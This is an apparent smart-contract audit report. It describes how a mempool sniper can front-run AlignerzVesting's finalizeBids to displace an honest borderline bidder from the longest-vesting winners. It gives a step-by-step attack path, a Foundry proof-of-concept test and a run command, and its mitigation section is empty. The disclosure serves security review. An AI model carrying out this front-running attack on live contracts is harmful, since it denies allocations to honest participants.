# [000006] Finalize bids design lets snipers secure minimum vesting period allocations
  
  ### Summary

Because [`AlignerzVesting::finalizeBids`](https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L783) is an owner transaction that simply closes the project and signals the backend to snapshot on-chain bids, a mempool sniper can wait until `finalizeBids` is broadcast, front-run it with a new `placeBid` that barely beats the current vesting-period cutoff, and be included in the off-chain “longest vesting” winners list, displacing an honest bidder moments before the allocation snapshot is taken.

### Root Cause

The contract keeps bidding open until the owner explicitly calls `finalizeBids`, and any bid submitted before that transaction executes is recorded with its chosen `vestingPeriod`:

```solidity
function placeBid(
    uint256 projectId,
    uint256 amount,
    uint256 vestingPeriod
) external {
    // ...
@>  require(
@>      block.timestamp >= biddingProject.startTime &&
@>          block.timestamp <= biddingProject.endTime &&
@>          !biddingProject.closed,
@>      Bidding_Period_Is_Not_Active()
@>  );
    // ...
@>  require(
@>      vestingPeriod < 2 || vestingPeriod % vestingPeriodDivisor == 0,
@>      Vesting_Period_Is_Not_Multiple_Of_The_Base_Value()
@>  );
    biddingProject.bids[msg.sender] = Bid({amount: amount, vestingPeriod: vestingPeriod});
    // ...
}
```

When the owner decides bidding should end, they call `finalizeBids`, which (per the sponsor’s Discord clarification) is invoked with a placeholder array of empty roots, emits `BiddingClosed`, and only later, after ~5 minutes of off-chain processing, does the owner call `updateProjectAllocations` with the real Merkle roots:

```solidity
function finalizeBids(
    uint256 projectId,
    bytes32 refundRoot,
    bytes32[] calldata merkleRoots,
    uint256 claimWindow
) external onlyOwner {
@>  require(!biddingProject.closed, Project_Already_Closed());
@>  biddingProject.closed = true;
@>  biddingProject.endTime = block.timestamp;
@>  biddingProject.claimDeadline = block.timestamp + claimWindow;
    emit BiddingClosed(projectId);
}

function updateProjectAllocations(
    uint256 projectId,
    bytes32 refundRoot,
    bytes32[] calldata merkleRoots
) external onlyOwner {
@>  require(biddingProject.closed, Project_Still_Open());
    // backfill roots derived off-chain from bids[bidder].vestingPeriod
}
```

The backend therefore reads the final `bids[bidder].vestingPeriod` values as soon as `BiddingClosed` fires and chooses the longest vesting periods (e.g. “top 10”) as winners. Because every bid is fully visible on-chain and nothing prevents a new bid from being inserted immediately before `finalizeBids` executes, a searcher can observe the current vesting leaderboard, submit a bid that is just slightly longer than the 10th place vesting duration, and front-run `finalizeBids` so that this new bid is included in the snapshot while knocking the honest borderline bidder out of the winners list. Once `updateProjectAllocations` is called, the displaced bidder has no Merkle proof and can never claim an NFT even though they met the published requirements before the snipe.

### Internal Pre-conditions

1. `AlignerzVesting::launchBiddingProject` and `AlignerzVesting::createPool` have been called, leaving a live project with `biddingProject.closed == false`.
2. Honest users have already placed bids with a range of `vestingPeriod` values such that only the top `N` (e.g., top 10) longest durations will be chosen by the backend when `BiddingClosed` is emitted.
3. The owner prepares to close bidding by calling `AlignerzVesting::finalizeBids`, following the sponsor’s flow where Merkle roots are initially empty and filled later via `updateProjectAllocations`.

### External Pre-conditions

1. The attacker can monitor the public mempool (standard MEV/searcher capability) to detect the pending `finalizeBids` transaction.
2. The attacker knows or can infer the backend’s selection rule (e.g., “only the 10 longest vesting periods win”) and has enough stablecoin to place a qualifying bid.

### Attack Path

1. Honest bidders place their bids throughout the auction; an honest “borderline” bidder currently sits in 10th place with an 80-day vesting period.
2. The owner submits `finalizeBids(projectId, emptyRoots, claimWindow)` to close the auction; the transaction appears in the mempool before being mined.
3. The attacker watches the mempool, calculates that setting `vestingPeriod = 80 days + 1` will be just enough to rank 10th, and immediately sends `placeBid(projectId, amount, 81 days)` with a higher gas price, front-running `finalizeBids`.
4. Both transactions land in the same block; the attacker’s bid executes first, then `finalizeBids` emits `BiddingClosed`, freezing on-chain bid data.
5. Off-chain, the backend listens to `BiddingClosed`, reads the final `bids[bidder]` mapping, and constructs Merkle roots that now include the attacker instead of the former 80-day bidder; a few minutes later the owner calls `updateProjectAllocations` with these roots.
6. When users attempt to claim, the displaced bidder lacks a valid Merkle proof and reverts, whereas the attacker successfully claims an NFT even though they entered after everyone thought bidding was over.

### Impact

Any auction whose scoring relies on the on-chain `bid.vestingPeriod` at `finalizeBids` time can be manipulated so that latecomers with mempool access displace honest participants at the last instant, leading to arbitrary denial of allocations for borderline bidders and undermining the economic meaning of vesting-period commitments. Users who bid early can be griefed out of the winners set, wasting their capital and blocking them from claiming NFTs or refunds even though they satisfied the published rules before the snipe.

### PoC

The following Foundry test (add to `protocol/test/AlignerzVestingProtocolTest.t.sol`) models the sponsor’s described flow—`finalizeBids` is called with empty roots, the backend updates allocations five minutes later, and winners are chosen by the longest vesting periods. Nine honest bidders have safely long vestings, bidder #9 sits on the 80-day cutoff, and an attacker waits for `finalizeBids` before placing an 80 days + 1 bid to slide into the top 10. After `updateProjectAllocations` is called, the borderline bidder can no longer claim, while the attacker succeeds:

```solidity
    // this POC assumes that the top-10 bidders with longest vesting periods will be considered the winners
    function test_POC_finalizeBids_sniper_enters_top_vesting_tier() public {
        address borderlineBidder = bidders[9];
        address nonWinner = bidders[10];
        address attacker = bidders[11];

        // Setup bidding project with one pool and whitelist all bidders
        vm.startPrank(projectCreator);
        vesting.setVestingPeriodDivisor(1);
        vesting.launchBiddingProject(
            address(token),
            address(usdt),
            block.timestamp,
            block.timestamp + 1_000_000,
            "0x0",
            true
        );
        vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.01 ether, true);
        vesting.addUsersToWhitelist(bidders, PROJECT_ID);
        vm.stopPrank();

        // Honest bidders commit with varying vesting periods; bidder[9] sits on
        // the cutoff (80 days) that would qualify as the 10th-longest vesting.
        uint256[] memory honestVestings = new uint256[](10);
        honestVestings[0] = 365 days;
        honestVestings[1] = 330 days;
        honestVestings[2] = 300 days;
        honestVestings[3] = 270 days;
        honestVestings[4] = 240 days;
        honestVestings[5] = 210 days;
        honestVestings[6] = 180 days;
        honestVestings[7] = 150 days;
        honestVestings[8] = 120 days;
        honestVestings[9] = 80 days; // borderline winner before the snipe

        for (uint256 i; i < honestVestings.length; i++) {
            vm.startPrank(bidders[i]);
            usdt.approve(address(vesting), BIDDER_USD);
            vesting.placeBid(PROJECT_ID, BIDDER_USD, honestVestings[i]);
            vm.stopPrank();
        }

        // Additional short-vesting bidder that would normally lose
        vm.startPrank(nonWinner);
        usdt.approve(address(vesting), BIDDER_USD);
        vesting.placeBid(PROJECT_ID, BIDDER_USD, 60 days);
        vm.stopPrank();

        // Attacker waits for finalizeBids, then front-runs it with the minimum
        // vesting needed to jump ahead of the borderline 80-day bidder.
        vm.startPrank(attacker);
        usdt.approve(address(vesting), BIDDER_USD);
        uint256 snipeVesting = honestVestings[9] + 1; // just enough to rank 10th
        vesting.placeBid(PROJECT_ID, BIDDER_USD, snipeVesting);
        vm.stopPrank();

        // finalizeBids is called with empty merkle roots per the sponsor's flow
        bytes32[] memory emptyRoots = new bytes32[](1);
        emptyRoots[0] = bytes32(0);
        vm.prank(projectCreator);
        vesting.finalizeBids(PROJECT_ID, bytes32(0), emptyRoots, 60 days);

        // Backend performs off-chain calculations after BiddingClosed

        // Backend keeps only the longest 10 vesting periods, which now include
        // the attacker instead of the borderline bidder.
        BidInfo[] memory allocationBids = new BidInfo[](12);
        for (uint256 i; i < honestVestings.length; i++) {
            allocationBids[i] = BidInfo({
                bidder: bidders[i],
                amount: BIDDER_USD,
                vestingPeriod: honestVestings[i],
                poolId: 0,
                accepted: i < 9 // first nine are safely in the top tier
            });
        }
        allocationBids[9].accepted = false; // borderline bidder bumped out
        allocationBids[10] = BidInfo({
            bidder: nonWinner,
            amount: BIDDER_USD,
            vestingPeriod: 60 days,
            poolId: 0,
            accepted: false
        });
        allocationBids[11] = BidInfo({
            bidder: attacker,
            amount: BIDDER_USD,
            vestingPeriod: snipeVesting,
            poolId: 0,
            accepted: true
        });

        bytes32 poolRoot = generateMerkleProofs(allocationBids, 0);
        bytes32[] memory finalRoots = new bytes32[](1);
        finalRoots[0] = poolRoot;

        vm.prank(projectCreator);
        vesting.updateProjectAllocations(
            PROJECT_ID,
            keccak256("refund"),
            finalRoots
        );

        // Borderline bidder can no longer claim because they were excluded
        vm.startPrank(borderlineBidder);
        vm.expectRevert(AlignerzVesting.Invalid_Merkle_Proof.selector);
        vesting.claimNFT(
            PROJECT_ID,
            0,
            BIDDER_USD,
            bidderProofs[borderlineBidder]
        );
        vm.stopPrank();

        // Attacker, who sniped finalizeBids, successfully claims the allocation
        vm.prank(attacker);
        uint256 attackerNftId = vesting.claimNFT(
            PROJECT_ID,
            0,
            BIDDER_USD,
            bidderProofs[attacker]
        );
        assertEq(nft.ownerOf(attackerNftId), attacker);
    }
```

Run  this PoC:

```bash
forge clean && forge test --match-test test_POC_finalizeBids_sniper_enters_top_vesting_tier -vv
```

### Mitigation


  